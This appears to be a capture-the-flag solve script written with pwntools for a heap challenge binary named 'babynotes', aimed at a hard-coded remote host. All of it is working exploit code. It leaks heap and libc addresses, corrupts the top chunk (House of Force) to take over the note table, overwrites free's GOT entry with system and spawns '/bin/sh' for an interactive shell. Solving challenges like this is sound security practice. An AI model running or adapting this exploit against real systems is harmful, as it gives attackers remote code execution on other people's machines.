#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
如果依赖特定版本的libc，请使用patchelf对可执行文件修改
例如，使用x64的2.23版本的libc，

patchelf --set-interpreter /glibc/2.23/64/lib/ld-linux-x86-64.so.2 babynotes@patched 
patchelf --replace-needed libc.so.6 /glibc/2.23/64/lib/libc.so.6 babynotes@patched

"""

import re, sys, os.path as path
from pwn import *
from pwnlib import gdb


context(arch="amd64", os="linux")

elf_name = path.join(path.dirname(path.abspath(__file__)), "babynotes@patched")
_, host, port = re.split("\s+", "nc 123.56.170.202 43121")

elf = ELF(elf_name)
io, context.log_level, libc = (remote(host, port), "info", ELF("./libc-2.23.so")) if len(sys.argv) > 1 else (process(elf_name), "debug", elf.libc)

def reg(name, motto, age):
    io.sendafter("Input your name: \n", name)
    io.sendafter("Input your motto: \n", motto)
    io.sendlineafter("Input your age: \n", str(age))

def add(idx, size):
    io.sendlineafter(">> ", "1")
    io.sendlineafter("Input index: \n", str(idx))
    io.sendlineafter("Input note size: \n", str(size))

def show(idx):
    io.sendlineafter(">> ", "2")
    io.sendlineafter("Input index: \n", str(idx))
    io.recvuntil(": ")
    return io.recvuntil("\n1. Add note\n", drop=True)

def delete(idx):
    io.sendlineafter(">> ", "3")
    io.sendlineafter("Input index: \n", str(idx))

def edit(idx, note):
    io.sendlineafter(">> ", "4")
    io.sendlineafter("Input index: \n", str(idx))
    io.sendafter("Input your note: \n", note)

def main():
    # init
    reg("A" * 0x17, "B" * 0x20, 9)
    add(0, 0x100)
    add(1, 0x18)
    add(2, 0x100)
    add(3, 0x18)

    # leak heap and libc
    delete(0)
    delete(2)
    add(0, 0x100)
    add(2, 0x100)
    edit(0, "C" * 8)
    edit(2, "D" * 8)
    heap_addr = u64(show(0)[8:].ljust(8, b"\0"))
    log.success("heap_addr = 0x%x", heap_addr)
    heap_base = heap_addr & 0xfffffffffffff000
    log.success("heap_base = 0x%x", heap_base)
    libc_addr = u64(show(2)[8:].ljust(8, b"\0"))
    log.success("libc_addr = 0x%x", libc_addr)
    libc.address = (libc_addr & 0xfffffffffffff000) - (0x00007f4db559e000 - 0x00007f4db51da000)
    log.success("libc_base = 0x%x", libc.address)
    log.success("system_addr = 0x%x", libc.sym["system"])

    # hack top chunk
    io.sendlineafter(">> ", "5")
    reg("E" * 0x18, "F" * 0x20, -1)
    top_chunk_addr = heap_base + (0x110 + 0x20) * 4 + 0x10
    log.debug("top_chunk_addr = 0x%x", top_chunk_addr)

    evil_chunk_size = 0x6020C0 - top_chunk_addr - 0x10 + 0x20
    log.debug("evil_chunk_size = %d", evil_chunk_size)

    delete(0)
    delete(1)
    delete(2)
    delete(3)
    add(3, evil_chunk_size)
    add(2, 0x100)
    add(1, 0x100)
    add(0, 0x100)
    
    

    payload = flat((
        0x6020e0, elf.got["free"],
    ))
    edit(2, "/bin/sh\0")
    edit(0, payload)
    edit(1, p64(libc.sym["system"]))

    if isinstance(io, process):
        gdb.attach(io, gdbscript="")
        pause()

    sleep(0.5)
    delete(2)

    io.interactive()


if __name__ == "__main__":
    main()